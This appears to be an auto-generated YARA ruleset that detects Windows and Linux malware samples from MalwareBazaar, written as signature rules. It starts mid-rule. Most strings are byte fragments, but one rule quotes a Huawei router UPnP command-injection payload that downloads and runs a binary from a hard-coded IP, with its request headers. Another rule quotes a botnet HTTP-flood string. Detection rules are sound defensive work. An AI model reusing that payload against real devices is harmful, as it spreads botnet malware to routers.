        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "B.iKM2"
        $s5 = "ffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 604KB
        and all of them
}

rule Linux_0cd1918717eb72d202bc7ce449d17ea01b94a298f54b034fed67122ef3750096
{
    meta:
        description = "Auto ML: 0cd1918717eb72d202bc7ce449d17ea01b94a298f54b034fed67122ef3750096"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "&$ip&Ei"
        $s2 = "ff4Jfg"
        $s3 = "POST /cdn-cgi/"
        $s4 = "HTTP/1.1"
        $s5 = "User-Agent:"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB
        and all of them
}

rule Linux_8abfc48c7084fadbd00f9ba6bb450b6688ca0159ba7be635b9ec5223f00c1989
{
    meta:
        description = "Auto ML: 8abfc48c7084fadbd00f9ba6bb450b6688ca0159ba7be635b9ec5223f00c1989"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!mcjbg`k"
        $s2 = "!~|am!`kz!zm~"
        $s3 = "FA}g`qw2W|u{|w2Cgw`k"
        $s4 = "!jkx!yozmfjai"
        $s5 = "!jkx!cg}m!yozmfjai"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB
        and all of them
}

rule Windows_8afd60f7ef24ac692068525fb3c91e74c60c066dff1f778db851ecc7b691f0bb
{
    meta:
        description = "Auto ML: 8afd60f7ef24ac692068525fb3c91e74c60c066dff1f778db851ecc7b691f0bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "a Q$%na}"
        $s5 = "be 6wQ"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1024KB
        and all of them
}

rule Linux_8b4fa0c77e55b191f3249468db847a346235f682398d37642488c1f26b6cc9fc
{
    meta:
        description = "Auto ML: 8b4fa0c77e55b191f3249468db847a346235f682398d37642488c1f26b6cc9fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "njGb_\\V"
        $s2 = "Tb@kAD0"
        $s3 = "5HGYP`"
        $s4 = "]5krA[H~"
        $s5 = "xv>Ek#Qu"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1222KB
        and all of them
}

rule Windows_8b6cc57f1b2da7e7b703b181f91ab63dce0891eae4ccfeb6e42452bdb02aa97a
{
    meta:
        description = "Auto ML: 8b6cc57f1b2da7e7b703b181f91ab63dce0891eae4ccfeb6e42452bdb02aa97a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6801KB
        and all of them
}

rule Windows_8be7871aecfc2e3039cefaeab9954a4ee7903ece4099bfa295936b030764f521
{
    meta:
        description = "Auto ML: 8be7871aecfc2e3039cefaeab9954a4ee7903ece4099bfa295936b030764f521"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "_Lambda__1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 30KB
        and all of them
}

rule Linux_8c8aaca5e8603bb34ff88481ce9525a163c97d0e57a00b04f4b9df35f0bd17f9
{
    meta:
        description = "Auto ML: 8c8aaca5e8603bb34ff88481ce9525a163c97d0e57a00b04f4b9df35f0bd17f9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB
        and all of them
}

rule Windows_8c8bc051a42578631ab04380a0daef57e67abd8cf1a272e75213285929a74c5e
{
    meta:
        description = "Auto ML: 8c8bc051a42578631ab04380a0daef57e67abd8cf1a272e75213285929a74c5e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.idata"
        $s3 = "CTB\"wi"
        $s4 = "ClCDv<"
        $s5 = "OzNn]_"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 11436KB
        and all of them
}

rule Windows_8c93c797c09d3b9480c9ff4c29b8573f61dad79c544b145fd61007209a635068
{
    meta:
        description = "Auto ML: 8c93c797c09d3b9480c9ff4c29b8573f61dad79c544b145fd61007209a635068"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "+ffeeffeeffe"
        $s5 = "fefefeffe"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 879KB
        and all of them
}

rule Windows_8cbee06cc554d522b77c75779cc6ca51f52e77accbf492670c4677c3d6abb88e
{
    meta:
        description = "Auto ML: 8cbee06cc554d522b77c75779cc6ca51f52e77accbf492670c4677c3d6abb88e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 233KB
        and all of them
}

rule Windows_8cd916321f1c8a63bd9fafb52a478ac65b3e86a33966bbfce60f5e46ffee6b8c
{
    meta:
        description = "Auto ML: 8cd916321f1c8a63bd9fafb52a478ac65b3e86a33966bbfce60f5e46ffee6b8c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "buTh\\eA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 112KB
        and all of them
}

rule Linux_0cffb72162b52e0036b5f73bd7dffdfa0fbaaf8caa19f5692f9db58cfd5382b2
{
    meta:
        description = "Auto ML: 0cffb72162b52e0036b5f73bd7dffdfa0fbaaf8caa19f5692f9db58cfd5382b2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "aCjCkCl"
        $s2 = "b<3mB,1<c"
        $s3 = "bL4mB,1Ld"
        $s4 = "b=@mBL4,1"
        $s5 = "bl6=B,1lf"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB
        and all of them
}

rule Linux_8cf2fcff837e7b78adda114235353380f69d5730993501db605a69ceae109455
{
    meta:
        description = "Auto ML: 8cf2fcff837e7b78adda114235353380f69d5730993501db605a69ceae109455"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Content-Length: 430"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 154KB
        and all of them
}

rule Windows_8d074060c491ad1e1366486ea95b2c11913423dbf978f8aa4748de9bdcaf7c4e
{
    meta:
        description = "Auto ML: 8d074060c491ad1e1366486ea95b2c11913423dbf978f8aa4748de9bdcaf7c4e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "D9994r1KTMnfAvKRL3PQ10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 59KB
        and all of them
}

rule Windows_8d1bfbe0d300231cf7892a9be51258a77f52a85eac045cb42a64b357702c0c5f
{
    meta:
        description = "Auto ML: 8d1bfbe0d300231cf7892a9be51258a77f52a85eac045cb42a64b357702c0c5f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 37KB
        and all of them
}

rule Windows_8d33b05e47547b982e0306165ae7d8441147db984e72adb5632ac2b9bcf6bc8f
{
    meta:
        description = "Auto ML: 8d33b05e47547b982e0306165ae7d8441147db984e72adb5632ac2b9bcf6bc8f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "?wDcqB"
        $s5 = "Install, Setup or Update"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_8d4d7a9744daead89a8e5af92249aa6d709e4f91ff33c774ba6e8c8289ec2020
{
    meta:
        description = "Auto ML: 8d4d7a9744daead89a8e5af92249aa6d709e4f91ff33c774ba6e8c8289ec2020"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Portions Copyright (c) 1999,2003 Avenger by NhT"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4620KB
        and all of them
}

rule Linux_8d6b1aa71dbee2f1421b121608685259d4f7266d441023725732c8d32732e2a8
{
    meta:
        description = "Auto ML: 8d6b1aa71dbee2f1421b121608685259d4f7266d441023725732c8d32732e2a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ":xcHCn"
        $s2 = "bYWKk>"
        $s3 = "8ev^XE"
        $s4 = "`CL5qy"
        $s5 = "AFlKX-"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB
        and all of them
}

rule Windows_8d6c9fdb875cc3e3048b4852b8bc60aff5d071270ba3bf976445534250cd5f09
{
    meta:
        description = "Auto ML: 8d6c9fdb875cc3e3048b4852b8bc60aff5d071270ba3bf976445534250cd5f09"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "b~JjaU F"
        $s4 = "^oMX h+"
        $s5 = "Raf 0m"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 579KB
        and all of them
}

rule Windows_8d8533278822162961e4bc205ed8e8ca33254c6653ce90bf22f8f25580d72ab1
{
    meta:
        description = "Auto ML: 8d8533278822162961e4bc205ed8e8ca33254c6653ce90bf22f8f25580d72ab1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 504KB
        and all of them
}

rule Windows_8d9576f6e8f69212d075b96842038e7353b5918919dad3b24859dbf4eabc80a9
{
    meta:
        description = "Auto ML: 8d9576f6e8f69212d075b96842038e7353b5918919dad3b24859dbf4eabc80a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1240KB
        and all of them
}

rule Linux_8d9ed544a9c0ccdbb620ebed506834a64f9f7932fcc446af50f5f9ac6170ce2f
{
    meta:
        description = "Auto ML: 8d9ed544a9c0ccdbb620ebed506834a64f9f7932fcc446af50f5f9ac6170ce2f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "D$JPPj"
        $s2 = "D$$PWV"
        $s3 = "T$(;|$(tlPPj"
        $s4 = "9|$$tBPPj"
        $s5 = "T$`VVj"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 105KB
        and all of them
}

rule Linux_0d906c688218ee0a23bfc6974eb6005991634dcd38c7f491a4f4dbeda43da71d
{
    meta:
        description = "Auto ML: 0d906c688218ee0a23bfc6974eb6005991634dcd38c7f491a4f4dbeda43da71d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "[http flood] headers: \"%s\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 84KB
        and all of them
}

rule Linux_8db753f0c572bb84e78d165cae9fc8f9efca13cb50871d7f306fecac21d16f05
{
    meta:
        description = "Auto ML: 8db753f0c572bb84e78d165cae9fc8f9efca13cb50871d7f306fecac21d16f05"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "}k>p}iXP"
        $s2 = "}J>p}GPP"
        $s3 = "}k>p}hXP"
        $s4 = "}J>p}IPP~i"
        $s5 = "LT`X(}iJx|c"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB
        and all of them
}

rule Windows_8dc99a54ad41d6eddef1c7d638bf28e332f4423763541e5ade32e8fc696ca3a2
{
    meta:
        description = "Auto ML: 8dc99a54ad41d6eddef1c7d638bf28e332f4423763541e5ade32e8fc696ca3a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4653KB
        and all of them
}

rule Windows_8dd62ac7109e2518c29ad610004eaf4fd3e1118c2fdbf359d580b0f8ac1589bb
{
    meta:
        description = "Auto ML: 8dd62ac7109e2518c29ad610004eaf4fd3e1118c2fdbf359d580b0f8ac1589bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "6g]zOMF"
        $s5 = "V+Jr't"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 206KB
        and all of them
}

rule Linux_8dd86d54bf0c3b6f0884a32133b5bbf5184a62c12116c0cd70c66596cb6ee6a4
{
    meta:
        description = "Auto ML: 8dd86d54bf0c3b6f0884a32133b5bbf5184a62c12116c0cd70c66596cb6ee6a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "0N^NuNV"
        $s3 = "N^NuNV"
        $s4 = "OHWHQHy"
        $s5 = "BAHA ."

    condition:
        uint32(0) == 0x464c457f and
        filesize < 116KB
        and all of them
}

rule Linux_8de19052409f19885f4c5c4088ec31254f5d35c6b5348d53d5ccb6f94210a684
{
    meta:
        description = "Auto ML: 8de19052409f19885f4c5c4088ec31254f5d35c6b5348d53d5ccb6f94210a684"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 152KB
        and all of them
}

rule Linux_8e160bb2b1c1d64a5017c752bc1ec64aa7651d0f3bca50f6561af5ba6e8e7a90
{
    meta:
        description = "Auto ML: 8e160bb2b1c1d64a5017c752bc1ec64aa7651d0f3bca50f6561af5ba6e8e7a90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Jf2/ZA"
        $s2 = "FTd]/x"
        $s3 = ">XuXN/"
        $s4 = "#wSTkS"
        $s5 = "~LKhJ~`"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 38KB
        and all of them
}

rule Windows_8e335f903d86e447fb05936d26290e5d7ee0250eef7bc7b1129c0a017db6c538
{
    meta:
        description = "Auto ML: 8e335f903d86e447fb05936d26290e5d7ee0250eef7bc7b1129c0a017db6c538"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Kozlhtg2"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 11KB
        and all of them
}

rule Windows_8e411fc8f14e13529b159a569f7da3298244a9d012bef0821748b193abf9dec2
{
    meta:
        description = "Auto ML: 8e411fc8f14e13529b159a569f7da3298244a9d012bef0821748b193abf9dec2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 939KB
        and all of them
}

rule Windows_8e45c8a0057c86bf0279d9c7173a2a7edc397ada2a72494692646e2ab84c49e5
{
    meta:
        description = "Auto ML: 8e45c8a0057c86bf0279d9c7173a2a7edc397ada2a72494692646e2ab84c49e5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.reloc"
        $s3 = "`.text"
        $s4 = "@.idata"
        $s5 = "@.wixburn"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 234KB
        and all of them
}

rule Windows_8eb79a0dd9103b2bddd05ae7227845650edeb0ed22722f6a62798cdbc18873a8
{
    meta:
        description = "Auto ML: 8eb79a0dd9103b2bddd05ae7227845650edeb0ed22722f6a62798cdbc18873a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = ",X qA~Ia}v"
        $s5 = "oCSa}]"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 88KB
        and all of them
}
